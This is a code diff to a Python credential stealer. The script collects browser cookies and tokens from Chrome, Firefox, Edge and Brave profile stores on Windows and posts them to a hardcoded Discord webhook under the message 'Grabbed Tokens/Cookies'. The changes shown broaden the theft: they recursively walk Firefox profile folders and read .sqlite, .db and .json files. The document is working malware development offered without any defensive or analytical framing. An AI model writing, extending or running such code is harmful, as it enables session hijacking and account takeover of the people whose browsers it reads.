@@ -1,12 +1,13 @@
 import os
 import re
+import sqlite3
 import requests
 from discord_webhook import DiscordWebhook
 
 # Define the path to common locations where tokens/cookies are stored
 paths = [
     os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"),
-    os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite"),
+    os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
     os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"),
     os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies")
 ]
@@ -17,8 +18,7 @@ webhook_url = 'https://discord.com/api/webhooks/1410001482262118421/DdzJLVU3vfQw
 # Function to read and parse cookies
 def read_cookies(file_path):
     cookies = []
-    if file_path.endswith('.sqlite'):
-        import sqlite3
+    if file_path.endswith('.sqlite') or file_path.endswith('.db'):
         conn = sqlite3.connect(file_path)
         cursor = conn.cursor()
         cursor.execute("SELECT name, value FROM moz_cookies")
@@ -42,9 +42,22 @@ def send_to_webhook(data):
 def main():
     all_cookies = []
     for path in paths:
-        if os.path.exists(path):
-            cookies = read_cookies(path)
-            all_cookies.extend(cookies)
+        if os.path.isdir(path):
+            for root, dirs, files in os.walk(path):
+                for file in files:
+                    if file.endswith('.sqlite') or file.endswith('.db') or file.endswith('.json'):
+                        file_path = os.path.join(root, file)
+                        try:
+                            cookies = read_cookies(file_path)
+                            all_cookies.extend(cookies)
+                        except Exception as e:
+                            print(f"Error reading {file_path}: {e}")
+        elif os.path.isfile(path):
+            try:
+                cookies = read_cookies(path)
+                all_cookies.extend(cookies)
+            except Exception as e:
+                print(f"Error reading {path}: {e}")
     if all_cookies:
         message = "Grabbed Tokens/Cookies:\n"
         for cookie in all_cookies:
